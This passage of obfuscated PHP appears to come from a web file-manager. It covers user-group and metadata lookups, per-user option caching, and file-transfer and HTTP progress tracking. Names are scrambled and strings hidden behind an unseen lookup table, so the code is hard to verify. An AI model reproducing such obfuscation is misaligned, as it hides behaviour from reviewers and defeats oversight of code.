$ÜîŞÂ—[$òÄêÖ¡•[443]][$òÄêÖ¡•[439]], $òÄêÖ¡•[2443] => 1, $òÄêÖ¡•[2445] => 1); } private function _searchFromMeta($ãÌ‘”±, $¶ß£É¦Ã, $ø¨¢ŞË) { $ó×Ö¡¹õ =& $_SERVER[ïÃ°£«Ê]; $¶ß£É¦Ã = strtolower($¶ß£É¦Ã); $éæ©­´ï = array($ó×Ö¡¹õ[95] => $ãÌ‘”±, $ó×Ö¡¹õ[451] => array($ó×Ö¡¹õ[473], "\x25{$¶ß£É¦Ã}\x25")); $éæ©­´ï = $this->parseWhereLike($éæ©­´ï); $”†‰ü€ì = Model($ó×Ö¡¹õ[2716])->where($éæ©­´ï)->limit($ø¨¢ŞË)->select(); if (!$”†‰ü€ì) { return array(); } $”†‰ü€ì = array_to_keyvalue($”†‰ü€ì, $ó×Ö¡¹õ[12], $ó×Ö¡¹õ[1594]); $õÑÙ¯ç‰ = $this->where(array($ó×Ö¡¹õ[1971] => array($ó×Ö¡¹õ[7], $”†‰ü€ì)))->select(); if (!$õÑÙ¯ç‰) { return array(); } return $õÑÙ¯ç‰; } private function _listDataApplyItem($‡´àÓ’ã) { $¢  Õ¢È = array($‡´àÓ’ã); $this->_listDataApply($¢  Õ¢È); return $¢  Õ¢È[0]; } private function _listDataApply(&$ñ¤Ã‰¢£) { $ó©°œ€» =& $_SERVER[ïÃ°£«Ê]; if (!$ñ¤Ã‰¢£) { return; } array_remove_key($ñ¤Ã‰¢£, $ó©°œ€»[1051]); $ö®Æö˜È = array_to_keyvalue($ñ¤Ã‰¢£, $ó©°œ€»[12], $ó©°œ€»[1594]); $this->_listAppendGroup($ñ¤Ã‰¢£, $ö®Æö˜È); $this->_listAppendMeta($ñ¤Ã‰¢£, $ö®Æö˜È); $this->_listAppendSourceRoot($ñ¤Ã‰¢£, $ö®Æö˜È); } private function _listAppendSourceRoot(&$ú¥Ÿëûñ, $æß«¢×ü) { $×ªş•®± =& $_SERVER[ïÃ°£«Ê]; $Èõ¿½¥¤ = Model($×ªş•®±[934])->listSourceRoot(SourceModel::TYPE_USER, $æß«¢×ü); $Èõ¿½¥¤ = array_to_keyvalue($Èõ¿½¥¤, $×ªş•®±[589]); $Èõ¿½¥¤ = array_remove_key($Èõ¿½¥¤, $×ªş•®±[589]); foreach ($ú¥Ÿëûñ as &$ı·‚½Î®) { $ı·‚½Î®[$×ªş•®±[90]] = $Èõ¿½¥¤[$ı·‚½Î®[$×ªş•®±[1594]]] ? $Èõ¿½¥¤[$ı·‚½Î®[$×ªş•®±[1594]]] : array(); } unset($ı·‚½Î®); } private function _listAppendGroup(&$Ú™ƒİÊ, $êºÀ˜™à) { $¸Ã¤¸® =& $_SERVER[ïÃ°£«Ê]; $¯Ìò·êö = array($¸Ã¤¸®[1594] => array($¸Ã¤¸®[7], $êºÀ˜™à)); $šêäÓ¨› = Model($¸Ã¤¸®[2279])->where($¯Ìò·êö)->select(); $®¤°¨¬š = array_to_keyvalue($šêäÓ¨›, $¸Ã¤¸®[12], $¸Ã¤¸®[1497]); $®¤°¨¬š = array_remove_value(array_unique($®¤°¨¬š), $¸Ã¤¸®[228]); if (!$®¤°¨¬š || !$šêäÓ¨›) { return; } $¯Ìò·êö = array($¸Ã¤¸®[1497] => array($¸Ã¤¸®[7], $®¤°¨¬š)); $ãÈÛ£Õ = Model($¸Ã¤¸®[1495])->field($¸Ã¤¸®[2717])->where($¯Ìò·êö)->select(); $ãÈÛ£Õ = array_to_keyvalue($ãÈÛ£Õ, $¸Ã¤¸®[1497]); $šêäÓ¨› = array_to_keyvalue_group($šêäÓ¨›, $¸Ã¤¸®[1594]); foreach ($šêäÓ¨› as &$Šô¾ş·–) { $ûã‚‘Š¦ = array(); foreach ($Šô¾ş·– as $÷ê¨Øµ) { if (!$÷ê¨Øµ[$¸Ã¤¸®[1642]]) { continue; } $œ­—˜‹† = Model($¸Ã¤¸®[591])->listData($÷ê¨Øµ[$¸Ã¤¸®[1642]]); $ûã‚‘Š¦[] = array($¸Ã¤¸®[1497] => $÷ê¨Øµ[$¸Ã¤¸®[1497]], $¸Ã¤¸®[2718] => $ãÈÛ£Õ[$÷ê¨Øµ[$¸Ã¤¸®[1497]]][$¸Ã¤¸®[32]], $¸Ã¤¸®[604] => $ãÈÛ£Õ[$÷ê¨Øµ[$¸Ã¤¸®[1497]]][$¸Ã¤¸®[604]], $¸Ã¤¸®[502] => $œ­—˜‹†); } $Šô¾ş·– = $ûã‚‘Š¦; } unset($Šô¾ş·–); foreach ($Ú™ƒİÊ as &$ßŞ‘•í´) { $ßŞ‘•í´[$¸Ã¤¸®[1496]] = array(); if (isset($šêäÓ¨›[$ßŞ‘•í´[$¸Ã¤¸®[1594]]])) { $ßŞ‘•í´[$¸Ã¤¸®[1496]] = $šêäÓ¨›[$ßŞ‘•í´[$¸Ã¤¸®[1594]]]; } } unset($ßŞ‘•í´); } public function userAppendGroup($«ªô½®Ë) { $¬ÚÃº»Ô =& $_SERVER[ïÃ°£«Ê]; if (!$«ªô½®Ë) { return array(); } $this->_listAppendGroup($«ªô½®Ë, array_to_keyvalue($«ªô½®Ë, $¬ÚÃº»Ô[12], $¬ÚÃº»Ô[1594])); return $«ªô½®Ë; } private function _listAppendMeta(&$İæ‡úô›, $‚¼‚İà) { $ôãÖ÷‰ò =& $_SERVER[ïÃ°£«Ê]; $ ¸©‹ô = UserJobModel::JOB_KEY; $ÎŞıÄç™ = array($ôãÖ÷‰ò[2275]); $ñÅïéÌ° = array($ôãÖ÷‰ò[1594] => array($ôãÖ÷‰ò[7], $‚¼‚İà)); $ğÛÙÛ†¢ = Model($ôãÖ÷‰ò[2693])->where($ñÅïéÌ°)->select(); $£Áø°àÔ = array(); foreach ($ğÛÙÛ†¢ as $ÅÂäµ) { $ÃÄÙ±ä° = $ÅÂäµ[$ôãÖ÷‰ò[1594]]; if (!isset($£Áø°àÔ[$ÃÄÙ±ä°])) { $£Áø°àÔ[$ÃÄÙ±ä°] = array(); } $£Áø°àÔ[$ÃÄÙ±ä°][$ÅÂäµ[$ôãÖ÷‰ò[95]]] = $ÅÂäµ[$ôãÖ÷‰ò[451]]; } $¬¼¤Ù¥à = Model($ôãÖ÷‰ò[2719]); foreach ($İæ‡úô› as &$£´–Ï¢ì) { $ÃÄÙ±ä° = $£´–Ï¢ì[$ôãÖ÷‰ò[1594]]; $†ñëü = isset($£Áø°àÔ[$ÃÄÙ±ä°]) ? $£Áø°àÔ[$ÃÄÙ±ä°] : array(); $£´–Ï¢ì[$ôãÖ÷‰ò[555]] = array_field_key($†ñëü, $ÎŞıÄç™); $£´–Ï¢ì[$ôãÖ÷‰ò[2720]] = array(); if (isset($†ñëü[$ ¸©‹ô])) { $£´–Ï¢ì[$ôãÖ÷‰ò[2720]] = $¬¼¤Ù¥à->getUserJobInfo($†ñëü[$ ¸©‹ô]); } } unset($£´–Ï¢ì); } protected function groupUserAll($‚ÌûĞ’) { $¨Õİñ¢ =& $_SERVER[ïÃ°£«Ê]; if (!$‚ÌûĞ’) { return !1; } $»àı²èß = Model($¨Õİñ¢[2279])->field($¨Õİñ¢[1594])->where(array($¨Õİñ¢[1497] => array($¨Õİñ¢[7], $‚ÌûĞ’)))->select(); $»àı²èß = array_to_keyvalue($»àı²èß, $¨Õİñ¢[12], $¨Õİñ¢[1594]); return array_unique($»àı²èß); } public function userSearch($¯››Áø, $ó¶ú·¨ = "\x2a") { return Model($_SERVER[ïÃ°£«Ê][617])->where($¯››Áø)->field($ó¶ú·¨)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\x5f\157\x70\x74\x69\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ñ—­½ñº) { return "\125\x73\145\162\x4f\160\164\x69\x6f\156\x5f{$ñ—­½ñº}\x5f" . KodUser::id(); } protected function filterWhere($÷ß¹üé) { $÷ß¹üé[$_SERVER[ïÃ°£«Ê][1594]] = KodUser::id(); return $÷ß¹üé; } public function cacheRemoveUser($¸¥Í‰ë¼, $ä­•ÛÂ³) { return Cache::remove("\125\x73\145\162\x4f\160\x74\x69\x6f\x6e\137{$¸¥Í‰ë¼}\x5f" . $ä­•ÛÂ³); } protected function optionDefault($Æ¸Ğéú„ = '') { $ÜÑÃìò½ =& $_SERVER[ïÃ°£«Ê]; if ($Æ¸Ğéú„ == $ÜÑÃìò½[12]) { return $GLOBALS[$ÜÑÃìò½[6]][$ÜÑÃìò½[2721]]; } if ($Æ¸Ğéú„ == $ÜÑÃìò½[2722]) { return $GLOBALS[$ÜÑÃìò½[6]][$ÜÑÃìò½[2723]]; } } } goto F‰²ßÈ³¥; d Œ‘„Ìè: class TaskFileTransfer extends Task { protected function startAfter() { $¬åíÇ’¾ =& $_SERVER[ïÃ°£«Ê]; $Ëª¥™¦Õ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¬åíÇ’¾[2010], array($this, $¬åíÇ’¾[2011])); Hook::bind($¬åíÇ’¾[1415], array($this, $¬åíÇ’¾[2012])); Hook::bind($¬åíÇ’¾[2013], array($this, $¬åíÇ’¾[2014])); Hook::bind($¬åíÇ’¾[690], array($this, $¬åíÇ’¾[2015])); Hook::bind($¬åíÇ’¾[691], array($this, $¬åíÇ’¾[2016])); Hook::bind($¬åíÇ’¾[697], array($this, $¬åíÇ’¾[2017])); Hook::bind($¬åíÇ’¾[698], array($this, $¬åíÇ’¾[2018])); Hook::bind($¬åíÇ’¾[693], array($this, $¬åíÇ’¾[2019])); Hook::bind($¬åíÇ’¾[695], array($this, $¬åíÇ’¾[2020])); Hook::bind($¬åíÇ’¾[659], array($this, $¬åíÇ’¾[2021])); Hook::bind($¬åíÇ’¾[656], array($this, $¬åíÇ’¾[2021])); Hook::bind($¬åíÇ’¾[661], array($this, $¬åíÇ’¾[2021])); Hook::bind($¬åíÇ’¾[663], array($this, $¬åíÇ’¾[2021])); Hook::bind($¬åíÇ’¾[665], array($this, $¬åíÇ’¾[2021])); Hook::bind($¬åíÇ’¾[2022], array($this, $¬åíÇ’¾[2023])); Hook::bind($¬åíÇ’¾[681], array($this, $¬åíÇ’¾[2024])); $this->sourceModelCopyFlag = !1; Hook::bind($¬åíÇ’¾[2025], array($this, $¬åíÇ’¾[2026])); Hook::bind($¬åíÇ’¾[2027], array($this, $¬åíÇ’¾[2028])); Hook::bind($¬åíÇ’¾[2029], array($this, $¬åíÇ’¾[2030])); $Ëª¥™¦Õ[$¬åíÇ’¾[2031]] = LNG($¬åíÇ’¾[2032]); $Ëª¥™¦Õ[$¬åíÇ’¾[2033]] = 0; $Ëª¥™¦Õ[$¬åíÇ’¾[2034]] = 0; $Ëª¥™¦Õ[$¬åíÇ’¾[1236]] = $¬åíÇ’¾[12]; $Ëª¥™¦Õ[$¬åíÇ’¾[2035]] = $¬åíÇ’¾[12]; $Ëª¥™¦Õ[$¬åíÇ’¾[2036]] = 0; $Ëª¥™¦Õ[$¬åíÇ’¾[2037]] = 0; $Ëª¥™¦Õ[$¬åíÇ’¾[942]] = 0; if (!$Ëª¥™¦Õ[$¬åíÇ’¾[1869]]) { $Ëª¥™¦Õ[$¬åíÇ’¾[1869]] = LNG($¬åíÇ’¾[2038]); } } protected function endAfter() { $Ğæïúà =& $_SERVER[ïÃ°£«Ê]; Hook::unbind($Ğæïúà[2010], array($this, $Ğæïúà[2011])); Hook::unbind($Ğæïúà[1415], array($this, $Ğæïúà[2012])); Hook::unbind($Ğæïúà[2013], array($this, $Ğæïúà[2014])); Hook::unbind($Ğæïúà[690], array($this, $Ğæïúà[2015])); Hook::unbind($Ğæïúà[691], array($this, $Ğæïúà[2016])); Hook::unbind($Ğæïúà[697], array($this, $Ğæïúà[2017])); Hook::unbind($Ğæïúà[698], array($this, $Ğæïúà[2018])); Hook::unbind($Ğæïúà[693], array($this, $Ğæïúà[2019])); Hook::unbind($Ğæïúà[695], array($this, $Ğæïúà[2020])); Hook::unbind($Ğæïúà[659], array($this, $Ğæïúà[2021])); Hook::unbind($Ğæïúà[656], array($this, $Ğæïúà[2021])); Hook::unbind($Ğæïúà[661], array($this, $Ğæïúà[2021])); Hook::unbind($Ğæïúà[663], array($this, $Ğæïúà[2021])); Hook::unbind($Ğæïúà[665], array($this, $Ğæïúà[2021])); Hook::unbind($Ğæïúà[2022], array($this, $Ğæïúà[2023])); Hook::unbind($Ğæïúà[681], array($this, $Ğæïúà[2024])); Hook::unbind($Ğæïúà[2025], array($this, $Ğæïúà[2026])); Hook::unbind($Ğæïúà[2027], array($this, $Ğæïúà[2028])); Hook::unbind($Ğæïúà[2029], array($this, $Ğæïúà[2030])); } public function copyMoveStart($ÌüÉéÊÒ, $›â¢„ôİ, $»çøˆş, $‘‚Øö†) { $Ñó°Ã£µ =& $_SERVER[ïÃ°£«Ê]; self::log($Ñó°Ã£µ[2039] . $›â¢„ôİ . $Ñó°Ã£µ[73] . $‘‚Øö†); $ÚŒ–Šøä = rtrim(TEMP_FILES, $Ñó°Ã£µ[8]); if (substr($›â¢„ôİ, 0, strlen($ÚŒ–Šøä)) == $ÚŒ–Šøä) { return; } if (substr($‘‚Øö†, 0, strlen($ÚŒ–Šøä)) == $ÚŒ–Šøä) { return; } $óª¨×áã =& $this->task; $óª¨×áã[$Ñó°Ã£µ[2040]] = KodIO::transferType($ÌüÉéÊÒ, $»çøˆş); self::log($Ñó°Ã£µ[2041] . $óª¨×áã[$Ñó°Ã£µ[2040]] . $Ñó°Ã£µ[74] . $›â¢„ôİ . $Ñó°Ã£µ[73] . $‘‚Øö†); $this->update(); } public function updateAfter() { $÷œ Îˆæ =& $_SERVER[ïÃ°£«Ê]; $üéµ„±™ =& $this->task; if (!$üéµ„±™[$÷œ Îˆæ[865]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($üéµ„±™[$÷œ Îˆæ[2040]] == $÷œ Îˆæ[1516]) { return; } self::updateTask($üéµ„±™); } private static function updateTask(&$ùşëÔ±Î) { $®¦†Ğ‚Ö =& $_SERVER[ïÃ°£«Ê]; if ($ùşëÔ±Î[$®¦†Ğ‚Ö[2040]] == $®¦†Ğ‚Ö[1387] || $ùşëÔ±Î[$®¦†Ğ‚Ö[2040]] == $®¦†Ğ‚Ö[107]) { if ($ùşëÔ±Î[$®¦†Ğ‚Ö[2035]]) { $ùşëÔ±Î[$®¦†Ğ‚Ö[942]] = $ùşëÔ±Î[$®¦†Ğ‚Ö[2037]] + $ùşëÔ±Î[$®¦†Ğ‚Ö[2034]]; } } else { if ($ùşëÔ±Î[$®¦†Ğ‚Ö[2040]] == $®¦†Ğ‚Ö[1517]) { if ($ùşëÔ±Î[$®¦†Ğ‚Ö[2035]] == $®¦†Ğ‚Ö[1387]) { $ùşëÔ±Î[$®¦†Ğ‚Ö[942]] = $ùşëÔ±Î[$®¦†Ğ‚Ö[2037]] + $ùşëÔ±Î[$®¦†Ğ‚Ö[2034]] * 0.5; } else { if ($ùşëÔ±Î[$®¦†Ğ‚Ö[2035]] == $®¦†Ğ‚Ö[107]) { $ùşëÔ±Î[$®¦†Ğ‚Ö[942]] = $ùşëÔ±Î[$®¦†Ğ‚Ö[2037]] + $ùşëÔ±Î[$®¦†Ğ‚Ö[2033]] * 0.5 + $ùşëÔ±Î[$®¦†Ğ‚Ö[2034]] * 0.5; } } } } $ùşëÔ±Î[$®¦†Ğ‚Ö[1981]] = $ùşëÔ±Î[$®¦†Ğ‚Ö[942]] / $ùşëÔ±Î[$®¦†Ğ‚Ö[865]]; if ($ùşëÔ±Î[$®¦†Ğ‚Ö[1981]] > 0) { $¬²äå = timeFloat() - $ùşëÔ±Î[$®¦†Ğ‚Ö[1983]] - $ùşëÔ±Î[$®¦†Ğ‚Ö[1986]]; $ùşëÔ±Î[$®¦†Ğ‚Ö[1987]] = $¬²äå * (1 - $ùşëÔ±Î[$®¦†Ğ‚Ö[1981]]) / $ùşëÔ±Î[$®¦†Ğ‚Ö[1981]]; } $­°·†ÛÃ = $ùşëÔ±Î[$®¦†Ğ‚Ö[2034]] . $®¦†Ğ‚Ö[993] . $ùşëÔ±Î[$®¦†Ğ‚Ö[2033]] . "\x3b\40{$Õ§Ìë}\x3b" . $ùşëÔ±Î[$®¦†Ğ‚Ö[942]]; self::log($®¦†Ğ‚Ö[2042] . $ùşëÔ±Î[$®¦†Ğ‚Ö[2035]] . $®¦†Ğ‚Ö[74] . $ùşëÔ±Î[$®¦†Ğ‚Ö[1981]] . $®¦†Ğ‚Ö[74] . $­°·†ÛÃ); } public function addPath($°ÆøŞíò) { $Úšâ¿§Ğ =& $_SERVER[ïÃ°£«Ê]; if (!$°ÆøŞíò) { return; } $Í³™‚©Î =& $this->task; $Ş½Âó‹Ö = IO::infoWithChildren($°ÆøŞíò); $œøñÉ = $Í³™‚©Î[$Úšâ¿§Ğ[2043]] ? $Í³™‚©Î[$Úšâ¿§Ğ[2043]][$Úšâ¿§Ğ[2044]] : 0; $Í³™‚©Î[$Úšâ¿§Ğ[2043]] = array($Úšâ¿§Ğ[2044] => $œøñÉ + 1, $Úšâ¿§Ğ[509] => $Ş½Âó‹Ö[$Úšâ¿§Ğ[32]], $Úšâ¿§Ğ[87] => $Ş½Âó‹Ö[$Úšâ¿§Ğ[87]], $Úšâ¿§Ğ[602] => $Ş½Âó‹Ö[$Úšâ¿§Ğ[602]] ? $Ş½Âó‹Ö[$Úšâ¿§Ğ[602]] : $Ş½Âó‹Ö[$Úšâ¿§Ğ[87]]); if ($Ş½Âó‹Ö[$Úšâ¿§Ğ[33]] == $Úšâ¿§Ğ[230]) { $Í³™‚©Î[$Úšâ¿§Ğ[1234]] += 1; } else { $Í³™‚©Î[$Úšâ¿§Ğ[1234]] += $Ş½Âó‹Ö[$Úšâ¿§Ğ[82]][$Úšâ¿§Ğ[80]]; if ($Ş½Âó‹Ö[$Úšâ¿§Ğ[191]]) { $Í³™‚©Î[$Úšâ¿§Ğ[1234]] += $Ş½Âó‹Ö[$Úšâ¿§Ğ[82]][$Úšâ¿§Ğ[81]] + 1; } } $Í³™‚©Î[$Úšâ¿§Ğ[865]] += $Ş½Âó‹Ö[$Úšâ¿§Ğ[79]]; $this->update(); self::log(array($Úšâ¿§Ğ[2045] . $°ÆøŞíò, $Ş½Âó‹Ö)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($³¿­šç‹) { } public function sourceAddHashEnd($€–œ£Ğ÷) { } public function sourceAddFileStart($½×¯Ìô°) { $ß˜±±ÀØ =& $_SERVER[ïÃ°£«Ê]; $ëíÙ»èÑ =& $this->task; $ëíÙ»èÑ[$ß˜±±ÀØ[2033]] = $½×¯Ìô°[$ß˜±±ÀØ[79]]; $ëíÙ»èÑ[$ß˜±±ÀØ[2031]] = $½×¯Ìô°[$ß˜±±ÀØ[32]]; $ëíÙ»èÑ[$ß˜±±ÀØ[1236]] = $½×¯Ìô°[$ß˜±±ÀØ[32]]; $ëíÙ»èÑ[$ß˜±±ÀØ[2046]] = $½×¯Ìô°[$ß˜±±ÀØ[87]]; $this->update(); self::log($ß˜±±ÀØ[2047] . $½×¯Ìô°[$ß˜±±ÀØ[87]] . $ß˜±±ÀØ[2048] . $½×¯Ìô°[$ß˜±±ÀØ[79]]); } public function sourceAddFileEnd($éĞÄ©) { $â›¶±ƒ =& $_SERVER[ïÃ°£«Ê]; $Öµ˜ÚÛ¯ =& $this->task; $Öµ˜ÚÛ¯[$â›¶±ƒ[942]] += $éĞÄ©[$â›¶±ƒ[79]]; $Öµ˜ÚÛ¯[$â›¶±ƒ[2046]] = $éĞÄ©[$â›¶±ƒ[87]]; $this->update(1); self::log($â›¶±ƒ[2049] . $éĞÄ©[$â›¶±ƒ[87]] . $â›¶±ƒ[2048] . $éĞÄ©[$â›¶±ƒ[79]] . $â›¶±ƒ[2050]); } public function copyFileStart($³˜°ÆĞ¼, $µÏÒô·², $«ÌÃÎİ°, $Ôá‰¢Ÿ±, $Øğ£İ, $Á¥€ú„á) { $Ñïİ¿ =& $_SERVER[ïÃ°£«Ê]; $ğøÜ‹‘ = $Øğ£İ; if ($ğøÜ‹‘ == $GLOBALS[$Ñïİ¿[2051]]) { $ğøÜ‹‘ = $GLOBALS[$Ñïİ¿[2052]]; } $GLOBALS[$Ñïİ¿[2052]] = $Øğ£İ; $GLOBALS[$Ñïİ¿[2051]] = $Á¥€ú„á; $¼×ÚñÓ± =& $this->task; $¼×ÚñÓ±[$Ñïİ¿[2031]] = $ğøÜ‹‘; $¼×ÚñÓ±[$Ñïİ¿[2033]] = (int) $³˜°ÆĞ¼->size($µÏÒô·²); $¼×ÚñÓ±[$Ñïİ¿[2034]] = 0; $¼×ÚñÓ±[$Ñïİ¿[1236]] = $Ñïİ¿[12]; $¼×ÚñÓ±[$Ñïİ¿[2035]] = $Ñïİ¿[12]; $¼×ÚñÓ±[$Ñïİ¿[2036]] = 0; $º ‹ŒÍÓ = $¼×ÚñÓ±[$Ñïİ¿[2033]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¼×ÚñÓ±[$Ñïİ¿[487]] . $Ñïİ¿[2053]); if ($º ‹ŒÍÓ && file_exists(get_path_father($Ôá‰¢Ÿ±))) { Cache::set($¼×ÚñÓ±[$Ñïİ¿[487]] . $Ñïİ¿[2053], $Ôá‰¢Ÿ±); $¼×ÚñÓ±[$Ñïİ¿[2004]] = array($Ñïİ¿[2054], $Ñïİ¿[2055]); } $this->update(0, $º ‹ŒÍÓ); self::log("\x63\157\x70\171\x46\151\x6c\x65\123\x74\x61\162\164\x3a{$µÏÒô·²}\x3b"); } public static function updateCopyLocalFileSize($–Ê°¯Öæ) { $Ñ—¹Üó§ =& $_SERVER[ïÃ°£«Ê]; $àşÂíó… = Cache::get($–Ê°¯Öæ[$Ñ—¹Üó§[487]] . $Ñ—¹Üó§[2053]); if (!$àşÂíó… || !file_exists($àşÂíó…)) { return $–Ê°¯Öæ; } $–Ê°¯Öæ[$Ñ—¹Üó§[2034]] = @filesize($àşÂíó…); $–Ê°¯Öæ[$Ñ—¹Üó§[942]] += $–Ê°¯Öæ[$Ñ—¹Üó§[2034]]; self::updateTask($–Ê°¯Öæ); return $–Ê°¯Öæ; } public function copyFileEnd($òÃ¢§ï­, $Ç°¿à÷Õ, $°‘âîÈ¹, $”Îâ…Üñ, $˜ÌµİÎ¨, $É´â”øº) { $×ùÛûóà =& $_SERVER[ïÃ°£«Ê]; $Á¾šÇé­ =& $this->task; $Á¾šÇé­[$×ùÛûóà[2034]] = $Á¾šÇé­[$×ùÛûóà[2033]]; $Á¾šÇé­[$×ùÛûóà[2035]] = $×ùÛûóà[12]; unset($Á¾šÇé­[$×ùÛûóà[2004]]); if ($˜ÌµİÎ¨ == $Á¾šÇé­[$×ùÛûóà[2031]]) { $Á¾šÇé­[$×ùÛûóà[2037]] += $Á¾šÇé­[$×ùÛûóà[2033]]; $Á¾šÇé­[$×ùÛûóà[942]] = $Á¾šÇé­[$×ùÛûóà[2037]]; $§Èú²Õø = 1; if (isset($Á¾šÇé­[$×ùÛûóà[2046]]) && $Á¾šÇé­[$×ùÛûóà[2046]] == $Ç°¿à÷Õ) { $§Èú²Õø = 0; } $this->update($§Èú²Õø); } else { $this->update(); $Á¾šÇé­[$×ùÛûóà[2034]] = 0; } Cache::remove($Á¾šÇé­[$×ùÛûóà[487]] . $×ùÛûóà[2053]); self::log($×ùÛûóà[2056] . $Ç°¿à÷Õ . $×ùÛûóà[73] . $”Îâ…Üñ . $×ùÛûóà[285] . $˜ÌµİÎ¨ . $×ùÛûóà[2057] . $Á¾šÇé­[$×ùÛûóà[2031]]); } public function updateFileEnd($Æ»™Îï¶, $Í¯ÄÑ†Ó) { $­¸åËéè =& $_SERVER[ïÃ°£«Ê]; $€›Å =& $this->task; $€›Å[$­¸åËéè[2031]] = $Æ»™Îï¶; $€›Å[$­¸åËéè[2033]] = $Í¯ÄÑ†Ó; $€›Å[$­¸åËéè[2037]] += $Í¯ÄÑ†Ó; $€›Å[$­¸åËéè[942]] = $€›Å[$­¸åËéè[2037]]; $this->update(1); self::log($­¸åËéè[2058] . $Æ»™Îï¶); } public function sourceModelCopy($ÁäÎ¤­À) { $Âß™Ãº¢ =& $_SERVER[ïÃ°£«Ê]; $ÇÈµ¥Ã£ = $ÁäÎ¤­À[0]; $£½Áû£ = $ÁäÎ¤­À[1]; $±÷šÂ´Í =& $this->task; $this->sourceModelCopyFlag = !0; $ÍÂıõÃÓ = 0; switch ($ÇÈµ¥Ã£) { case $Âß™Ãº¢[657]: $ÍÂıõÃÓ = 1; break; case $Âß™Ãº¢[660]: $±÷šÂ´Í[$Âß™Ãº¢[2031]] = $£½Áû£[$Âß™Ãº¢[32]]; break; case $Âß™Ãº¢[662]: $ÍÂıõÃÓ = intval($ÁäÎ¤­À[$Âß™Ãº¢[467]] * 0.4); break; case $Âß™Ãº¢[664]: $ÍÂıõÃÓ = intval($ÁäÎ¤­À[$Âß™Ãº¢[467]] * 0.2); break; case $Âß™Ãº¢[666]: $ÍÂıõÃÓ = intval($ÁäÎ¤­À[$Âß™Ãº¢[467]] * 0.4); break; } $this->update($ÍÂıõÃÓ); self::log(array("{$ÇÈµ¥Ã£}\x3b\141\144\x64\75{$ÍÂıõÃÓ}", $ÁäÎ¤­À)); $this->sourceModelCopyFlag = !1; } public function sourceRemove($›ÅŸå‹§, $ğäâÚÇë) { $ãç¤–Ç =& $_SERVER[ïÃ°£«Ê]; $this->sourceModelCopyFlag = !0; $ØôèĞ™ = 1; if (isset($›ÅŸå‹§[$ãç¤–Ç[82]])) { $ØôèĞ™ = $›ÅŸå‹§[$ãç¤–Ç[82]][$ãç¤–Ç[80]]; $ØôèĞ™ = $ØôèĞ™ + $›ÅŸå‹§[$ãç¤–Ç[82]][$ãç¤–Ç[81]] + 1; } $this->update($ØôèĞ™); $this->sourceModelCopyFlag = !1; $this->log(array($ãç¤–Ç[2059], $ØôèĞ™, $›ÅŸå‹§)); } public function sourceMove($Í´şË„¸) { $this->sourceRemove($Í´şË„¸, !1); } public function curlProgress($ñ¾‘öô, $ò¼–ß÷¹, $åÉÒìÀÆ, $ÂÛÊÉ¯, $¨é»®©) { $¥ƒ…äæ =& $_SERVER[ïÃ°£«Ê]; $ ãüïŞÖ =& $this->task; if ($¨é»®© > 0) { $ ãüïŞÖ[$¥ƒ…äæ[1236]] = $¥ƒ…äæ[2060]; $ ãüïŞÖ[$¥ƒ…äæ[2035]] = $¥ƒ…äæ[107]; if ($ ãüïŞÖ[$¥ƒ…äæ[2033]]) { $ ãüïŞÖ[$¥ƒ…äæ[2034]] = $¨é»®©; } if ($ ãüïŞÖ[$¥ƒ…äæ[2036]]) { $ ãüïŞÖ[$¥ƒ…äæ[2034]] = $¨é»®© + $ ãüïŞÖ[$¥ƒ…äæ[2036]]; } } else { if ($åÉÒìÀÆ > 0) { if ($ ãüïŞÖ[$¥ƒ…äæ[2033]] == $ò¼–ß÷¹) { $ ãüïŞÖ[$¥ƒ…äæ[2034]] = $åÉÒìÀÆ; $ ãüïŞÖ[$¥ƒ…äæ[1236]] = $¥ƒ…äæ[2061]; $ ãüïŞÖ[$¥ƒ…äæ[2035]] = $¥ƒ…äæ[1387]; } } } $this->update(); $‘üÉçÉõ = "\x64\157\x77\156\x3a{$åÉÒìÀÆ}\57{$ò¼–ß÷¹}\x3b\40\x75\160\154\x6f\141\144\x3a{$¨é»®©}\57{$ÂÛÊÉ¯}\73\x66\151\x6c\145\x3d" . $ ãüïŞÖ[$¥ƒ…äæ[2033]]; self::log(array($¥ƒ…äæ[2062] . $‘üÉçÉõ . $¥ƒ…äæ[74] . $ ãüïŞÖ[$¥ƒ…äæ[2031]], curl_getinfo($ñ¾‘öô))); } public function curlProgressStart($÷İüœüş) { } public function curlProgressEnd($¡”†¸·) { $ˆ‘ù£¨‚ =& $_SERVER[ïÃ°£«Ê]; $‚¹Ó‰ƒı =& $this->task; $«˜ñ¤å = curl_getinfo($¡”†¸·); $ÒÄ—–½ = $«˜ñ¤å[$ˆ‘ù£¨‚[2063]]; if ($ÒÄ—–½ == -1) { $ÒÄ—–½ = $«˜ñ¤å[$ˆ‘ù£¨‚[2064]]; } if ($‚¹Ó‰ƒı[$ˆ‘ù£¨‚[2035]] == $ˆ‘ù£¨‚[107] && $ÒÄ—–½) { $‚¹Ó‰ƒı[$ˆ‘ù£¨‚[2036]] += $ÒÄ—–½; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $şÜÌ¨°™ =& $_SERVER[ïÃ°£«Ê]; $ÔÍÅèÏœ =& $this->task; $ÔÍÅèÏœ[$şÜÌ¨°™[2065]] = 1; Hook::bind($şÜÌ¨°™[2025], array($this, $şÜÌ¨°™[2066])); Hook::bind($şÜÌ¨°™[2027], array($this, $şÜÌ¨°™[2067])); Hook::bind($şÜÌ¨°™[2029], array($this, $şÜÌ¨°™[2068])); } protected function endAfter() { $™§Ÿ³½¾ =& $_SERVER[ïÃ°£«Ê]; Hook::unbind($™§Ÿ³½¾[2025], array($this, $™§Ÿ³½¾[2066])); Hook::unbind($™§Ÿ³½¾[2027], array($this, $™§Ÿ³½¾[2067])); Hook::unbind($™§Ÿ³½¾[2029], array($this, $™§Ÿ³½¾[2068])); } public function progressStart($»êôãèœ) { $–²Â…ú =& $_SERVER[ïÃ°£«Ê]; $€ˆ¹Âîª = curl_getinfo($»êôãèœ); self::log($–²Â…ú[2069] . $€ˆ¹Âîª[$–²Â…ú[382]]); self::valueSet($this->task[$–²Â…ú[487]], $this->task); } public function progressEnd($œ‰‹«µ†) { $¿øİµÏ =& $_SERVER[ïÃ°£«Ê]; 